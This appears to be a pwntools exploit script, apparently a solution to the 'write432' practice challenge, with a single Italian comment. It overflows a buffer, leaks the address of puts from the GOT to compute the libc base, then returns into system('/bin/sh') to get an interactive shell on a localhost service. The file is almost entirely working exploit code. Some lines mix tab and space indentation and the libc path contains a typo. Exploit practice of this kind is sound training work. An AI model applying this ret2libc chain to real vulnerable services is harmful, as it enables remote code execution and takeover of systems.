#!/bin/python

from pwn import *

e = ELF('./write432')
libc = ELF('/lib/i386-linux--gnu/libc.so.6') #In generale qui va il path alla libreria libc che scarichiamo in locale

r = remote('localhost', 1234)

puts = e.symbols['puts']
main = e.symbols['main']
putsgot = e.got['puts']

def leak(address):
	payload = p32(puts)
	payload += p32(main)
	payload += p32(address)
	r.recvuntil('>')
	r.sendline("A"*44 + payload)
	r.recv()
	value = u32(r.recv(4))
	return value

def exploit(system, binsh):
	payload = p32(system)
	payload += "AAAA"
	payload += p32(binsh)
	r.recvuntil('>')
	r.sendline("A"*44 + payload)
	r.recv()

def getsystem():
	puts_got = leak(putsgot)
	log.success("Puts leaked at: " + hex(puts_got))

	puts_local = libc.symbols['puts']
        log.success("Puts local at: " + hex(puts_local))

	libcbase = puts_got - puts_local
	log.success("libc base at: " + hex(libcbase))

	system = libc.symbols['system'] + libcbase
        log.success("system at: " + hex(system))

	binsh = next(libc.search("/bin/sh\x00")) + libcbase
	log.success("bin/sh at:" + hex(binsh))
	return system,binsh

system,binsh = getsystem()

exploit(system,binsh)

r.interactive()


